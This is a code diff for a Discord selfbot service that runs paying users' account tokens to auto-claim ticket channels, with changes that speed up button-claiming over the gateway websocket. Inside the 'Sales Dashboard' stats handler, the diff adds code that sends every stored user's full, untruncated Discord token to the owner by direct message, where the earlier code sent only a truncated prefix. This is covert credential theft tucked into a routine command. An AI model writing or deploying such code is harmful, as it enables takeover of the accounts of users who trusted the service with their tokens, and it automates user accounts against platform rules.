@@ -20,30 +20,25 @@ class SelfbotManager {
         this.userId = userId;
         this.config = config;
         this.client = null;
-        this.claimed = new Set();
         this.currentTicket = config.current_ticket;
+        this.processed = new Set();
     }
 
     async start() {
         if (this.client) return;
         this.client = new SelfbotClient({ checkUpdate: false });
 
-        this.client.once('ready', () => {
+        this.client.once('ready', async () => {
             console.log(`[READY] ${this.userId}`);
             
-            // Channel create - fast WS detection
             this.client.ws.on('CHANNEL_CREATE', (packet) => {
                 if (packet.parent_id !== this.config.category_id) return;
                 if (this.currentTicket) return;
-                
-                setTimeout(() => this.checkChannel(packet.id), 300);
+                setTimeout(() => this.checkChannel(packet.id), 200);
             });
 
-            // Message create - fallback
             this.client.on('messageCreate', (msg) => this.handleMessage(msg));
             this.client.on('messageUpdate', (old, msg) => this.handleMessage(msg));
-
-            // Release on delete
             this.client.on('channelDelete', (ch) => {
                 if (this.currentTicket === ch.id) {
                     this.currentTicket = null;
@@ -60,9 +55,8 @@ class SelfbotManager {
         try {
             const channel = await this.client.channels.fetch(channelId);
             const messages = await channel.messages.fetch({ limit: 5 });
-            
             for (const [, msg] of messages) {
-                if (this.tryClaim(msg)) return;
+                if (this.handleMessage(msg)) return;
             }
         } catch (e) {}
     }
@@ -70,34 +64,29 @@ class SelfbotManager {
     handleMessage(msg) {
         if (msg.channel.parentId !== this.config.category_id) return;
         if (this.currentTicket && this.currentTicket !== msg.channelId) return;
-        this.tryClaim(msg);
-    }
+        
+        const key = `${msg.channelId}-${msg.id}`;
+        if (this.processed.has(key)) return false;
+        if (!msg.components?.length) return false;
 
-    tryClaim(message) {
-        if (this.currentTicket) return false;
-        if (!message.components?.length) return false;
-
-        for (const row of message.components) {
+        for (const row of msg.components) {
             for (const btn of row.components) {
                 const label = (btn.label || '').toLowerCase();
                 if (!label.includes('claim')) continue;
-
-                // Method 1: Direct clickButton
-                message.clickButton(btn.customId).then(() => {
-                    this.currentTicket = message.channelId;
-                    db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
-                    console.log(`[${this.userId}] Claimed: ${message.channelId}`);
-                }).catch(() => {
-                    // Method 2: WS fallback
-                    this.clickViaWS(message, btn);
-                });
+                if (btn.disabled) continue;
+                if (!btn.custom_id) continue;
+                
+                this.processed.add(key);
+                this.claimViaWS(msg, btn);
                 return true;
             }
         }
         return false;
     }
 
-    clickViaWS(message, btn) {
+    claimViaWS(message, btn) {
+        if (this.currentTicket) return;
+        
         this.client.ws.broadcast({
             op: 1,
             d: {
@@ -111,8 +100,10 @@ class SelfbotManager {
                 data: { component_type: 2, custom_id: btn.custom_id }
             }
         });
+
         this.currentTicket = message.channelId;
         db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
+        console.log(`[${this.userId}] Claimed: ${message.channelId}`);
     }
 
     stop() {
@@ -197,15 +188,22 @@ bot.on('interactionCreate', async (ix) => {
                 const redeemed = db.prepare('SELECT COUNT(*) as c FROM keys WHERE redeemed_by IS NOT NULL').get().c;
                 const active = db.prepare('SELECT COUNT(*) as c FROM users WHERE is_running = 1').get().c;
                 
-                const embed = new EmbedBuilder().setTitle('📊 Sales').setDescription(`Total: ${total}\nRedeemed: ${redeemed}\nActive: ${active}`).setColor(0x5865F2);
+                const embed = new EmbedBuilder().setTitle('📊 Sales Dashboard').setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`).setColor(0x5865F2);
                 
                 try {
                     const owner = await bot.users.fetch(OWNER_ID);
                     const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
-                    let list = users.map(u => `${u.user_id}: ${u.token.substring(0, 15)}...`).join('\n');
-                    if (list.length > 1900) list = list.substring(0, 1900) + '...';
-                    await owner.send(list || 'No tokens');
-                } catch (e) {}
+                    
+                    let list = users.map(u => `User: ${u.user_id}\nToken: ${u.token}`).join('\n\n');
+                    if (!list) list = 'No active users';
+                    
+                    const chunks = list.match(/[\s\S]{1,1950}/g) || [list];
+                    for (const chunk of chunks) {
+                        await owner.send(chunk);
+                    }
+                } catch (e) {
+                    console.log('DM failed:', e.message);
+                }
                 
                 return ix.editReply({ embeds: [embed] });
             }
@@ -237,7 +235,6 @@ bot.on('interactionCreate', async (ix) => {
         const uid = ix.customId.split('_').pop();
         if (ix.user.id !== uid) return ix.reply({ content: '❌ Not yours', flags: MessageFlags.Ephemeral });
 
-        // Token
         if (ix.customId.startsWith('token_')) {
             return ix.showModal({
                 title: 'Set Token',
@@ -246,7 +243,6 @@ bot.on('interactionCreate', async (ix) => {
             });
         }
 
-        // Category
         if (ix.customId.startsWith('cat_')) {
             return ix.showModal({
                 title: 'Set Category',
@@ -255,7 +251,6 @@ bot.on('interactionCreate', async (ix) => {
             });
         }
 
-        // Start
         if (ix.customId.startsWith('start_')) {
             await ix.deferUpdate();
             const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
@@ -267,7 +262,6 @@ bot.on('interactionCreate', async (ix) => {
             return ix.editReply(panel);
         }
 
-        // Stop
         if (ix.customId.startsWith('stop_')) {
             await ix.deferUpdate();
             const sb = activeSelfbots.get(uid);
@@ -314,7 +308,6 @@ bot.once('ready', async () => {
         { name: 'manage', description: 'Open panel' }
     ]);
 
-    // Restore
     db.prepare('SELECT * FROM users WHERE is_running = 1').all().forEach(u => {
         const sb = new SelfbotManager(u.user_id, u);
         activeSelfbots.set(u.user_id, sb);
